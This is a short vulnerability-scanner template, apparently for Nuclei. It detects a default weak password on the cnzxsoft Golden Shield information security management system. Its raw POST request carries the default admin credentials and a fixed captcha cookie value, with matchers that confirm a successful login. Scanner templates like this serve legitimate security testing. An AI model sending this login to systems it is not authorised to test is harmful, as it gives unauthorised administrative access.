http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && contains(body_1,"1") && contains(header_1,"ZXSOFT_JDIS_USR_NAME=deleted")
      && !contains(body_1,"userpwd_error")
    type: dsl
  raw:
  - 'POST /?q=common/login  HTTP/1.1

    Host: {{Hostname}}

    Cookie: check_code=ptbh

    Content-Type: application/x-www-form-urlencoded


    name=admin&password=zxsoft1234!%40%23%24&checkcode=ptbh&doLoginSubmit=1

    '
id: cnzxsoft-information-security-management-system-default-login
info:
  author: SleepingBag945
  description: 'cnzxsoft Golden Shield Information Security Management System has
    a default weak password.

    '
  name: cnzxsoft information security management system default account
  severity: high
  tags: default
